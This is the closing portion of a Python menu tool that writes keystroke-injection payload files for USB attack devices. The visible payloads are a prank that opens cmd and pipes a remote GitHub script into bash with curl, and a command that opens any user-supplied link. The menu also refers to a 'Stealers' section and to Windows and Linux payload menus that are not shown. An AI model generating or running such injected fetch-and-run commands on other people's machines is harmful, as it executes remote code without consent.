        print(f"{Fore.YELLOW}[!] {Fore.GREEN}Start webbrowser with youtube music ?")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Yes")
        print(f" {Fore.RED}2{Fore.GREEN}. No\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        if choice == '0':
            recurrence()
            Stealers()
        elif choice == '1':
            pass
        elif choice == '2':
            pass
        else:
            errormenu()
            Stealers()    
        
        with open("Fun_RickRoll.txt", 'w') as file:
            file.write("DELAY 250\nGUI r\nDELAY 500\nSTRING cmd\nENTER\DELAY 500\n")
            string1 = ""
            string2 = "curl -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash"
            if choice == '1':
                string1 = "start https://www.youtube.com/watch?v=dQw4w9WgXcQ & "
            elif choice == '2':
                pass
            file.write(f"STRING {string1}{string2}\nENTER")
        done()
        
    elif choix == "3": # Lanch webpage
        recurrence()
        choice = input(f"{Fore.YELLOW}Link to open : {Fore.GREEN}").strip()
        with open("Fun_LaunchWebpage.txt", 'w') as file:
            file.write(f"DELAY 250\nGUI r\nDELAY 500\nSTRING cmd\nENTER\DELAY 500\nSTRING start {choice}\nENTER")
        done()


#########################################################
# ===================== MAIN MENU ===================== #
#########################################################

def selectmenu():
    recurrence()
    print(f" {Fore.YELLOW}0{Fore.GREEN}. Exit")
    print(f" {Fore.RED}1{Fore.GREEN}. Infos -- Show program infos")
    print(f" {Fore.RED}2{Fore.GREEN}. Windows payloads")
    print(f" {Fore.RED}3{Fore.GREEN}. Linux payloads\n")
    
    choix = input(f"{Fore.YELLOW}Select 0 to 2 : {Fore.GREEN}")

    if choix == "1": # Infos
        print(disclaimer)
        input("Press [ENTER] to continue ...")
        selectmenu()
        
    elif choix == "2":
        windows()

    elif choix == "3":
        linux()
        
    elif choix == "0": # Exit
        exitapp()
        
    else: # Error
        errormenu()
        selectmenu()


def main():
    cleanit()
    print(banner)
    input(f"\n {Fore.GREEN}Press [ENTER] to continue ...")
    selectmenu()
    
    
if __name__ == "__main__":
    main()
